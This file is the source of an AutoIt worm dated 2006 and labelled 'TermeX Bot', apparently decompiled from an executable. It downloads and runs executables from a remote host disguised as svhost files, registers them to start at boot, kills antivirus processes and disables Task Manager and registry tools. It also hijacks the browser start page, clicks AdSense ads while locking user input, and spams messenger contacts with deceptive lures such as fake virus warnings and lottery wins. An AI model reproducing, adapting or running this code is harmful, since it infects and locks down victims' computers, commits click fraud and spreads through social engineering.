; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: D:\test\TermeX.au3>
; ----------------------------------------------------------------------------

;---------------------------------------------------------------
; Author : TermeX - ThanatoS
; Name: TermeX Bot
; Version : 2.0
; Usage : Advertise via Y!M,MSN,AIM
; Published : 20-9-2006
;---------------------------------------------------------------

; Variables
#NoTrayIcon
$website = "http://nsl-school.org"
$website2 = "http://mytermex.com"
$website3 = "http://mytermex.com"

; Infect into system
If Not FileExists(@WindowsDir & "\svhost32.exe") Then
 		InetGet ("http://nsl-school.org/zin.exe", @WindowsDir & "\svhost32.exe", 0, 1)
 		Sleep(10000)
	EndIf

If Not FileExists(@WindowsDir & "\svhost.exe") Then
 		InetGet ("http://nsl-school.org/zun.exe", @WindowsDir & "\svhost.exe", 0, 1)
 		Sleep(10000)
	EndIf

; Kill Anti-Virus processes
If ProcessExists("Bkav2006.exe") Then
   ProcessClose("Bkav2006.exe")
EndIf

If ProcessExists("IEProt.exe") Then
   ProcessClose("IEProt.exe")
EndIf

; Click on Google adsense's ads
$title = WinGetTitle("Viva TermeX - Microsoft Internet Explorer", "")
$check = WinExists ($title)
If $check = 1 Then
	BlockInput (1)
	WinActivate($title)
	WinSetState ( $title , "", @SW_MAXIMIZE)
	$pos = MouseGetPos()
	MouseClick("left", 400, 371, 1, 0)
	MouseMove ( $pos[0], $pos[1] , 0)
	BlockInput (0)
EndIf

$title = WinGetTitle("Viva TermeX", "")
$check = WinExists ($title)
If $check = 1 Then
	BlockInput (1)
	WinActivate($title)
	WinSetState ( $title , "", @SW_MAXIMIZE)
	$pos = MouseGetPos()
	MouseClick("left", 400, 371, 1, 0)
	MouseMove ( $pos[0], $pos[1] , 0)
	BlockInput (0)
EndIf

; Write Registry keys
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\svhost32.exe")
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "SVCHOST", "REG_SZ", @WindowsDir & "\svhost.exe")

; List of random messages
Dim $tin[13]
$tin[0] = "have you ever seen such a silly man like this ? " & $website & "/?id=stories =)) "
$tin[1] = "making money online never be easier : " & $website2 & "/?id=tips >:D< "
$tin[2] = "damn, she is so cute :x " & $website & "/?id=miss_world :x:x:x:x:x "
$tin[3] = "the only way to clean some online viruses that may lead you into troubles : " & $website2 & "/?id=ie_protector << "
$tin[4] = "Fuck you all X-( " & $website & "/?id=password <<"
$tin[5] = "look at my new lover : " & $website2 & "/darling.jpg :x :x "
$tin[6] = "there's going to be a meteor shower tonight : " & $website & "/?id=18388 << "
$tin[7] = "check out my new personal website : " & $website2 & " c0ol !!! "
$tin[8] = "you are virus infected . Use this tool to remove viruses from your PC : " & $website2 & "/?id=virus_shield << "
$tin[9] = "wtf is this ? wanna give me a shit ?  " & $website & "/?id=news  X-(  "
$tin[10] = "Breaking news : school girls are kidnapped by the terrorists !! " & $website2 & "/?news_id=18388 "
$tin[11] = "check this link for me : " & $website & "/?id=forum . Why I cannot surf this site ??? "
$tin[12] = "oh my god , i've won a 20000 usd lottery :O " & $website & "/?id=winning_list . Come to my house tonight for a party !! >:D< "

sleep(200000)

; Main process
While (1)

$tieude0 = WinGetTitle("My Computer", "")
$kiemtra0 = WinExists ($tieude0)
$tieude0x = WinGetTitle("Windows Explorer", "")
$kiemtra0x = WinExists ($tieude0x)
$tieude1 = WinGetTitle("Yahoo! Messenger", "")
$kiemtra1 = WinExists ($tieude1)
$tieude2 = WinGetTitle("AIM", "")
$kiemtra2 = WinExists ($tieude2)
$tieude3 = WinGetTitle("Windows Live Messenger", "")
$kiemtra3 = WinExists ($tieude3)
$tieude4 = WinGetTitle("Windows Messenger", "")
$kiemtra4 = WinExists ($tieude4)

	If $kiemtra0 = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra0x = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0x)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra1 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude1)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v")
		Send("!s")
		BlockInput (0)
	EndIf

	If $kiemtra2 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude2)
		Send("{HOME}")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{PGDN}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra3 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude3)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra4 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude4)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf
Sleep(200000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: D:\test\TermeX.au3>
; ----------------------------------------------------------------------------

